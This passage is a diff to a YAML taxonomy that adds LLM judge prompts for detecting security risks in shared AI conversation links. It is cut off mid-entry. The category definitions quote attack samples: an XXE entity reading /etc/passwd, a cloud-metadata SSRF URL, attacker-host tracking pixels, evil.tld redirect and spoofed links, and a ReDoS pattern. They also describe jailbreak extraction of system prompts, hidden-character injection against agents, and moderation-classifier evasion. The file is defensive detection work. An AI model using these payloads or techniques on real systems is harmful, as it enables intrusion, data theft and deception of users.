@@ -2,6 +2,12 @@ meta:
   source: taxonomy-0901-v5.xlsx
   sheet: 症状
   count: 49
+  llm_prompt_count: 40
+  llm_excluded:
+    B-C-3: 'distillation attack itself not observable by third parties; Kevin''s I-column verdict: skipped'
+    B-A-1: 'creation-side rate data not available to third parties; Kevin''s I-column verdict: skipped'
+    B-IA-3: corpus-level clustering capability (batch layer), out of scope for per-record detection
+    B-IA-5: H column explicitly marks LLM as not applicable (structural static detection suffices)
   exported_at: '2026-09-04'
   status_legend:
     implemented: detection implemented in Phase 1
@@ -311,9 +317,36 @@ categories:
   tracks:
   - static
   - llm
-  status: phase2_llm
+  status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "System prompt disclosure".
+
+
+      ## Category definition
+
+      攻击者通过注入/越狱诱导 AI 吐出系统提示词，再借分享链接把提取过程与提示词原文公开。（如：贴出 “You are…” 系统指令、内部规则、工具定义清单）｜识别信号：正文含疑似平台系统提示片段或其逐步提取过程。
+
+      ## Detection guidance (from taxonomy)
+
+      判定片段是否为系统提示成分及其提取语境（跨语种）。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-C-2
   model: Model B
   l1: DIS 泄露与收割
@@ -330,6 +363,34 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "External resource tracking (viewer de-anonymization)".
+
+
+      ## Category definition
+
+      攻击者在分享内容嵌入指向自有服务器的外链资源，查看者或摘要 Agent 一加载即被动发起请求，泄露其 IP、UA、时间、Referer 以去匿名“谁看了链接”。（如：![](https://attacker/px.png)、远程 CSS/字体、1×1
+      追踪像素）｜识别信号：正文含指向第三方主机、随打开自动加载的资源。
+
+      ## Detection guidance (from taxonomy)
+
+      判定资源与对话主题无关性（追踪意图）。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-C-3
   model: Model B
   l1: DIS 泄露与收割
@@ -343,7 +404,8 @@ categories:
   - platform
   - llm
   status: skipped
-  note: No detectable feature; paper story only, not labeled
+  note: 'No detectable feature; paper story only, not labeled; distillation attack itself not observable by third parties;
+    Kevin''s I-column verdict: skipped'
   kevin_note: 没有可行的检测特征。因此这个可以作为我们论文故事的一部分，但是不用实际标注（理论上所有帖子都会有这个安全隐患）
 - id: B-C-4
   model: Model B
@@ -361,6 +423,41 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Preview-triggered SSRF".
+
+
+      ## Category definition
+
+      分享内容含指向内部目标的 URL，平台为生成预览卡片/缩略图在服务端主动抓取时被诱导访问内网/云元数据并回传。（如：http://169.254.169.254/ 云元数据、localhost 管理端口、内网服务 URL）｜识别信号：内容或
+      OG 标签含内网地址/云元数据端点。
+
+      ## Detection guidance (from taxonomy)
+
+      判定 URL 在语境中构成 SSRF 诱导（vs 讨论 SSRF 的教学内容）。
+
+
+      ## Judging scope
+
+      The attack triggers when the platform preview-fetches a URL. You judge the content-side inducement: does the conversation
+      embed URLs pointing at internal targets (localhost, 127.0.0.1, 169.254.x, cloud metadata endpoints, intranet hosts)
+      that a preview bot would be tricked into fetching?
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-C-5
   model: Model B
   l1: INJ 注入与执行
@@ -377,6 +474,34 @@ categories:
   status: implemented
   note: Payload lives in raw bytes; static scan detects it
   kevin_note: 这里的攻击载荷就写在 SVG/XML 的原始字节里，扫一遍字节就能发现。只要数据存的是原始文件字节理论上就可以检测。
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "XML external entity injection (XXE)".
+
+
+      ## Category definition
+
+      分享内容含 SVG/XML/OOXML/RSS，平台服务端解析生成预览/可搜索文本时若未禁用外部实体，则读取本地文件或发起带外请求。（如：<!DOCTYPE foo [<!ENTITY x SYSTEM ''file:///etc/passwd''>]>、参数实体+外链
+      DTD）｜识别信号：XML 原始字节含 DOCTYPE/ENTITY/SYSTEM 与 file://。
+
+      ## Detection guidance (from taxonomy)
+
+      判定实体结构是否具攻击指向（vs 正常 DTD/教学示例）
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-C-6
   model: Model B
   l1: SCH 侧信道与推断
@@ -392,6 +517,33 @@ categories:
   status: candidate
   note: Flag anomalous cross-origin resource candidates -> manual review; victim presence not required
   kevin_note: 可以通过识别对话中嵌入的异常跨源资源检测候选，然后对候选进行人工核验。（注意，我们的检测目标并不是确认攻击的完整可达，因此无需确保受害者在场，只需要识别可能有此类威胁的案例即可）
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Cross-site leaks (XS-Leaks)".
+
+
+      ## Category definition
+
+      攻击者在分享页嵌入指向第三方已鉴权端点的跨源资源并布置可观测探针，查看者打开即带凭证请求，据副作用差分推断其在别处的私密状态。（如：onload/onerror 差异、加载耗时、iframe 帧计数、CSP 违规上报数）｜识别信号：内容含跨源资源加载+可测量副作用探针结构。
+
+      ## Detection guidance (from taxonomy)
+
+      判定探针结构的侧信道意图
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: true
 - id: B-I-1
   model: Model B
   l1: COV 隐蔽信道·基础设施滥用
@@ -406,6 +558,33 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Harmful content hosting/distribution".
+
+
+      ## Category definition
+
+      攻击者使平台托管违规有害内容并经链接分发，绕过内容安全、借可信域作分发基础设施。（如：暴恐/自伤诱导材料、恶意工具源码、违禁交易信息）｜识别信号：正文命中有害内容分类且以分享链接对外传播。
+
+      ## Detection guidance (from taxonomy)
+
+      多语种有害内容分类（暴恐/自伤/违禁交易/恶意工具源码）——跨语种语义为主要依赖，静态仅兜底。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-I-2
   model: Model B
   l1: POI 投毒
@@ -420,6 +599,33 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "AI search results manipulation (GEO)".
+
+
+      ## Category definition
+
+      攻击者构造内容以提高链接被 AI 搜索检索、召回、引用、纳入生成答案的概率，操纵用户对特定查询获得的结果。（如：堆叠目标关键词/语义近似、伪造引用与权威表达、植入统计“证据”）｜识别信号：针对特定查询的过度优化措辞与虚假引用信号。
+
+      ## Detection guidance (from taxonomy)
+
+      判定“面向 AI 检索召回的过度优化”与权威伪装意图（措辞目标性分析）。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-I-3
   model: Model B
   l1: POI 投毒
@@ -434,6 +640,33 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Traditional SEO manipulation".
+
+
+      ## Category definition
+
+      攻击者借 AI 平台域名权重，创建含外部站点/产品信息的分享链接以抬升目标外部内容在传统搜索引擎的排名。（如：长尾关键词页、指向推广站点的锚文本农场）｜识别信号：内容主体是与对话无关的外链推广或关键词堆砌。
+
+      ## Detection guidance (from taxonomy)
+
+      判定内容与对话语境无关的推广意图。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-I-4
   model: Model B
   l1: DEC 伪造·欺骗·社工
@@ -448,6 +681,40 @@ categories:
   status: phase2_dynamic
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Share preview card forgery (OpenGraph/oEmbed)".
+
+
+      ## Category definition
+
+      攻击者操纵对话首条消息/标题以完全控制平台派生的 OG/oEmbed 元数据，使链接在第三方 IM 渲染出挂平台可信域名却内容伪造的预览卡片，在点击前即误导。（如：伪造权威标题、来源署名、配图）｜识别信号：OG 元数据与对话真实内容不一致。
+
+      ## Detection guidance (from taxonomy)
+
+      标题/署名/配图与正文语义一致性判定。
+
+
+      ## Judging scope
+
+      The share-card metadata (title) is provided at the top of the conversation. Judge semantic consistency between that
+      title and the conversation body; mismatch alone is a weak signal — cap confidence at 0.6 unless the title is clearly
+      baiting (clickbait/impersonation).
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-I-5
   model: Model B
   l1: DEC 伪造·欺骗·社工
@@ -491,6 +758,33 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Moderation classifier evasion (obfuscation)".
+
+
+      ## Category definition
+
+      攻击者对将分享的违规内容施加对抗性扰动，使平台自动审核模型误判为安全放行，而人类仍能还原有害语义。（如：字符混淆、拆词插标点、切低资源语言/编码变体、良性文本包裹违规载荷）｜识别信号：内容含异常混淆/编码但语义可还原为违规。
+
+      ## Detection guidance (from taxonomy)
+
+      归一化前后语义判定，分类分叉即命中（对抗规避的本质是语义可还原）。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-I-8
   model: Model B
   l1: DEC 伪造·欺骗·社工
@@ -502,9 +796,43 @@ categories:
   tracks:
   - llm
   - static
-  status: future_work
+  status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "False factual claims".
+
+
+      ## Category definition
+
+      攻击者自行编造或诱导 AI 生成不存在、无证据支持的事实性陈述，经分享链接传播以误导查看者。（如：虚构新闻、编造的人物经历/引文、伪造统计数据、错误历史“事实”）｜识别信号：可核查的具体断言与权威来源不符或查无实据。
+
+      ## Detection guidance (from taxonomy)
+
+      断言抽取（claim detection）→ 检索式事实验证（与权威源 NLI 蕴含比对）+ LLM-as-judge 复核——事实真伪静态规则不可判，语义分析为主
+
+
+      ## Known limitation
+
+      You have NO retrieval/fact-checking capability. You CANNOT verify factual truth. Judge ONLY the weaker content-side
+      signal: the density of high-specificity assertions made without any source, citation, or hedge. This is a weak signal:
+      cap confidence at 0.6 and state in reasoning that factuality was not verified.
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-I-9
   model: Model B
   l1: DEC 伪造·欺骗·社工
@@ -516,9 +844,36 @@ categories:
   tracks:
   - llm
   - static
-  status: phase2_llm
+  status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Misleading summaries".
+
+
+      ## Category definition
+
+      攻击者构造或诱导 AI 生成表面部分正确、却遗漏限制条件/例外/时效/反方证据的总结，经分享传播以形成误导性整体印象。（如：只列有利事实、删去适用条件与风险警告、把过时信息当作现状）｜识别信号：结论与被省略的关键限定/时效相冲突。
+
+      ## Detection guidance (from taxonomy)
+
+      源对话与结论 NLI 蕴含审计（关键限定/例外/时效省略检测）+“结论-证据覆盖度”评分
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-I-10
   model: Model B
   l1: DEC 伪造·欺骗·社工
@@ -530,9 +885,36 @@ categories:
   tracks:
   - llm
   - static
-  status: phase2_llm
+  status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Harmful decision advice".
+
+
+      ## Category definition
+
+      攻击者构造或诱导 AI 对资格、风险或因果作出错误判断并经分享传播，诱使人或系统据此误决策。（如：错误医疗/用药建议、错误法律判断、误报“审批已通过”、错误安全告警）｜识别信号：可验证的建议与专业标准/事实相悖且带明确行动指向。
+
+      ## Detection guidance (from taxonomy)
+
+      行动指向语句识别 + 领域知识库校验（医疗/法律规则）判定建议与专业标准相悖性
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-A-1
   model: Model B
   l1: DoS 资源耗尽
@@ -545,7 +927,8 @@ categories:
   - platform
   - llm
   status: skipped
-  note: No detectable feature; paper story only, not labeled
+  note: 'No detectable feature; paper story only, not labeled; creation-side rate data not available to third parties; Kevin''s
+    I-column verdict: skipped'
   kevin_note: 没有可行的检测特征。因此这个可以作为我们论文故事的一部分，但是不用实际标注
 - id: B-A-2
   model: Model B
@@ -562,6 +945,39 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Complex content rendering exhaustion".
+
+
+      ## Category definition
+
+      攻击者在分享内嵌超长上下文、深层嵌套 Markdown/HTML、超大代码块或高复杂度结构，使查看者浏览器内存/CPU 被大量占用乃至卡死。（如：数万层嵌套列表、超大表格/图片）｜识别信号：内容体量或嵌套深度远超正常阈值。
+
+      ## Detection guidance (from taxonomy)
+
+      判定结构复杂度是否恶意构造（vs 正当长文档）。
+
+
+      ## Judging scope
+
+      Judge whether the content structure looks maliciously constructed to burn rendering resources (deeply nested structures,
+      pathological repetition, combinatorial expansions) versus a legitimately long document.
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-A-3
   model: Model B
   l1: DoS 资源耗尽
@@ -576,6 +992,39 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Regex denial of service via crafted content".
+
+
+      ## Category definition
+
+      攻击者放入短但精心构造的字符串，触发平台服务端某条灾难性回溯正则（Markdown 解析/URL 抽取/高亮/审核/建索引），单次处理即令 CPU 指数级卡死。（如：(a+)+$ 型输入、超长重复前缀）｜识别信号：短字符串含针对已知正则的病态重复模式。
+
+      ## Detection guidance (from taxonomy)
+
+      辅助排除误报（合法 base64/压缩数据 vs 构造性载荷）。
+
+
+      ## Judging scope
+
+      Your role is CONFIRMATORY: distinguish legitimate encoded/compressed data (data exchange, backups) from constructed
+      ReDoS/decompression-bomb payloads. When in doubt, hit=false (the static track already flags candidates).
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-A-4
   model: Model B
   l1: DoS 资源耗尽
@@ -592,6 +1041,34 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Decompression/media bombs".
+
+
+      ## Category definition
+
+      分享内容内嵌或引用体积极小但解码后极度膨胀的资源，平台生成缩略图/预览或查看者解码时内存/CPU 非对称爆炸。（如：超高压缩比 PNG/GIF、含 billion-laughs 实体的 SVG、声明超大画布的图像）｜识别信号：文件仅几十
+      KB 却声明超大解码尺寸或深层实体展开比。
+
+      ## Detection guidance (from taxonomy)
+
+      辅助判定构造意图。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-CI-1
   model: Model B
   l1: INJ 注入与执行
@@ -603,7 +1080,7 @@ categories:
   tracks:
   - static
   status: future_work
-  note: ''
+  note: requires a multimodal provider (image content); text-only LLM track cannot judge
   kevin_note: null
 - id: B-CI-2
   model: Model B
@@ -620,6 +1097,34 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Zero-width/Bidi hidden-character injection".
+
+
+      ## Category definition
+
+      攻击者植入零宽字符、双向控制符或同形字，使人眼所见与真实逻辑字节/Agent 读取不一致；Agent 取用逻辑层真实字符执行隐藏指令(I)或据此外泄(C)，隐藏文本亦可污染 Agent 记忆。（如：U+200B 零宽、U+202E
+      Bidi override、西里尔同形字）｜识别信号：文本含零宽/双向控制/混合脚本码点。
+
+      ## Detection guidance (from taxonomy)
+
+      判定隐藏内容在逻辑层的注入语义。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-CI-3
   model: Model B
   l1: DEC 伪造·欺骗·社工
@@ -634,6 +1139,33 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Trusted-domain phishing/social engineering".
+
+
+      ## Category definition
+
+      攻击者在分享对话放入钓鱼/社工内容，借平台可信域名托管分发以降低警惕；查看者阅读即被诱导交出凭证(C)或被欺骗(I)。（如：伪造登录引导、“账号异常请点此验证”、冒充客服话术+外链）｜识别信号：内容含引导登录/输入凭证/转账的社工话术并配外链。
+
+      ## Detection guidance (from taxonomy)
+
+      多语种社工话术语义分类（登录/验证/转账诱导），覆盖话术变体。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-CI-4
   model: Model B
   l1: DEC 伪造·欺骗·社工
@@ -649,6 +1181,34 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Hyperlink anchor-text spoofing".
+
+
+      ## Category definition
+
+      正文超链接的可见锚文本显示为可信 URL，真实 href 指向攻击者站点；查看者或替其点击的 Agent 据可见文本信任而跳转，落入钓鱼/恶意下载（窃凭证 C / 欺骗 I）。（如：[https://accounts.google.com](https://evil.tld)）｜识别信号：锚文本域名与
+      href 域名不一致。
+
+      ## Detection guidance (from taxonomy)
+
+      辅助识别语义伪装变体（按钮文字/短链/显示 URL 与真实目标语境不符）。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-CI-5
   model: Model B
   l1: DEC 伪造·欺骗·社工
@@ -665,6 +1225,34 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Open redirect".
+
+
+      ## Category definition
+
+      平台分享/跳转/“继续”端点接受未白名单校验的可见跳转参数，URL 托管在可信平台域、真实落点藏在参数里，点击后经 30x 静默跳转至钓鱼站（C/I）。（如：/redirect?url=https://evil.tld）｜识别信号：平台域
+      URL 携带 ?next= / ?url= / ?redirect= 等外部跳转参数。
+
+      ## Detection guidance (from taxonomy)
+
+      辅助判定跳转参数的诱导目的。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-CI-6
   model: Model B
   l1: DEC 伪造·欺骗·社工
@@ -692,9 +1280,43 @@ categories:
   tracks:
   - static
   - llm
-  status: future_work
+  status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Embedded malicious QR codes (quishing)".
+
+
+      ## Category definition
+
+      AI 回答/分享页含二维码图片（模型生成或攻击者注入），编码指向钓鱼页/恶意 APK/攻击者收款地址；用户扫码走带外信道，绕过浏览器 URL 信誉与平台域提示（窃凭证/资金 C / 欺骗 I）。（如：“扫码领取/登录”配恶意二维码）｜识别信号：对分享页内图片做二维码解码得到的
+      URL 命中钓鱼/低信誉。
+
+      ## Detection guidance (from taxonomy)
+
+      解码目标 + 上下文话术（“扫码领取/登录”）的钓鱼意图判定。
+
+
+      ## Known limitation
+
+      You see TEXT ONLY; QR/barcode images are not visible to you. Judge ONLY when the conversation text itself contains scan-bait
+      phrasing (e.g. "scan to claim/log in") or decoded QR target URLs; otherwise hit=false.
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-CI-8
   model: Model B
   l1: POI 投毒
@@ -833,7 +1455,8 @@ categories:
   tracks:
   - llm
   status: future_work
-  note: ''
+  note: corpus-level clustering (batch layer over the full dataset), not per-record detection; corpus-level clustering capability
+    (batch layer), out of scope for per-record detection
   kevin_note: null
 - id: B-IA-4
   model: Model B
@@ -850,6 +1473,39 @@ categories:
   status: candidate
   note: base64/hex decode probes produce candidates -> manual/LLM target verification
   kevin_note: 根据内容理论上可以挑出候选（例如一段 base64/十六进制字符串，解码后像 IP/域名/命令）。但是真实性验证需要人工核验或者让LLM检验目标IP域名内容
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Share links as C2 dead drops".
+
+
+      ## Category definition
+
